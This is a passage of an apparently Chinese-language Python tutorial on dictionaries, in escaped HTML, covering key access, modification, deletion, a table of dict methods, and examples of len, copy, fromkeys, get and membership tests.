&lt;span class=&#34;token comment&#34;&gt;# {&#39;test&#39;: 1, 1: &#39;dddd&#39;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出2,test的值&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# test 1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;keys&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出所有键名&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# dict_keys([&#39;test&#39;, 1])&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;values&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出所有键值&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# dict_values([1, &#39;dddd&#39;])&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;txt&#39;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 修改键值&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {2: &#39;test&#39;, &#39;test&#39;: &#39;txt&#39;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; dict2&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 删除一个键&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;test&#39;: 1}&lt;/span&gt;
dict2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;clear&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 清空字典&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; dict2  &lt;span class=&#34;token comment&#34;&gt;# 删除字典&lt;/span&gt;
dict2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;var&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;str&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;var&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;var&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 重复时后者覆盖前者&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;1&#39;: 2, &#39;var&#39;: &#39;var&#39;, &#39;test&#39;: &#39;test&#39;}&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
{2: &#39;test&#39;, &#39;test&#39;: 1}
{&#39;test&#39;: 1, 1: &#39;dddd&#39;}
test 1
dict_keys([&#39;test&#39;, 1])
dict_values([1, &#39;dddd&#39;])
{2: &#39;test&#39;, &#39;test&#39;: &#39;txt&#39;}
{&#39;test&#39;: 1}
{}
{&#39;1&#39;: 2, &#39;var&#39;: &#39;var&#39;, &#39;test&#39;: &#39;test&#39;}
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;函数-3&#34;&gt;&lt;a href=&#34;#函数-3&#34; class=&#34;headerlink&#34; title=&#34;函数&#34;&gt;&lt;/a&gt;函数&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;序号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;函数及描述&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;实例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;1&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;len(dict) 计算字典元素个数，即键的总数。&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; dict = {&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;} &lt;/code&gt;&lt;br&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; len(dict) 3&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;2&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;str(dict) 输出字典，可以打印的字符串表示。&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; dict = {&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;}  &lt;/code&gt;&lt;br&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; str(dict) &lt;/code&gt;&lt;br&gt;&lt;code&gt;&#34;{&#39;Name&#39;: &#39;Runoob&#39;, &#39;Class&#39;: &#39;First&#39;, &#39;Age&#39;: 7}&#34;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;3&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;type(variable) 返回输入的变量类型，如果变量是字典就返回字典类型。&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; dict = {&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;}  &lt;/code&gt;&lt;br&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; type(dict) &lt;/code&gt;&lt;br&gt;&lt;code&gt;&amp;lt;class &#39;dict&#39;&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;序号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;函数及描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;1&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-dictionary-clear.html&#34;&gt;radiansdict.clear()&lt;/a&gt; 删除字典内所有元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;2&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-dictionary-copy.html&#34;&gt;radiansdict.copy()&lt;/a&gt; 返回一个字典的浅复制&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;3&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-dictionary-fromkeys.html&#34;&gt;radiansdict.fromkeys()&lt;/a&gt; 创建一个新字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;4&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-dictionary-get.html&#34;&gt;radiansdict.get(key, default=None)&lt;/a&gt; 返回指定键的值，如果键不在字典中返回 default 设置的默认值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;5&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-dictionary-in.html&#34;&gt;key in dict&lt;/a&gt; 如果键在字典dict里返回true，否则返回false&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;6&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-dictionary-items.html&#34;&gt;radiansdict.items()&lt;/a&gt; 以列表返回一个视图对象&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;7&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-dictionary-keys.html&#34;&gt;radiansdict.keys()&lt;/a&gt; 返回一个视图对象&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;8&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-dictionary-setdefault.html&#34;&gt;radiansdict.setdefault(key, default=None)&lt;/a&gt; 和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;9&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-dictionary-update.html&#34;&gt;radiansdict.update(dict2)&lt;/a&gt; 把字典dict2的键/值对更新到dict里&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;10&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-dictionary-values.html&#34;&gt;radiansdict.values()&lt;/a&gt; 返回一个视图对象&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;11&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[pop(key&lt;a href=&#34;https://www.runoob.com/python3/python3-att-dictionary-pop.html&#34;&gt;,default])&lt;/a&gt; 删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;12&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-dictionary-popitem.html&#34;&gt;popitem()&lt;/a&gt; 随机返回并删除字典中的最后一对键和值。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;函数示例-3&#34;&gt;&lt;a href=&#34;#函数示例-3&#34; class=&#34;headerlink&#34; title=&#34;函数示例&#34;&gt;&lt;/a&gt;函数示例&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Zara&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Age&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;字典长度 : %d&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;  &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 字典长度 : 2&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;clear&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;字典删除后长度 : %d&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;  &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 字典删除后长度 : 0&lt;/span&gt;

dict1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Age&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Class&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;First&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
dict2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; dict1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;copy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;新复制的字典为 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; dict2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 新复制的字典为 :  {&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;}&lt;/span&gt;

seq &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;age&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;sex&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fromkeys&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;seq&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;新的字典为 : %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 新的字典为 : {&#39;name&#39;: None, &#39;age&#39;: None, &#39;sex&#39;: None}&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fromkeys&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;seq&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;新的字典为 : %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 新的字典为 : {&#39;name&#39;: 10, &#39;age&#39;: 10, &#39;sex&#39;: 10}&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Age&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;27&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Age 值为 : %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;  &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Age&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Age 值为 : 27&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Sex 值为 : %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;  &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Sex&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;NA&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Sex 值为 : NA&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Age&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 检测键 Age 是否存在&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Age&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;键 Age 存在&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;键 Age 不存在&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 键 Age 存在&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 检测键 Sex 是否存在&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Sex&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;键 Sex 存在&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;键 Sex 不存在&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 键 Sex 不存在&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# not in&lt;/span&gt;

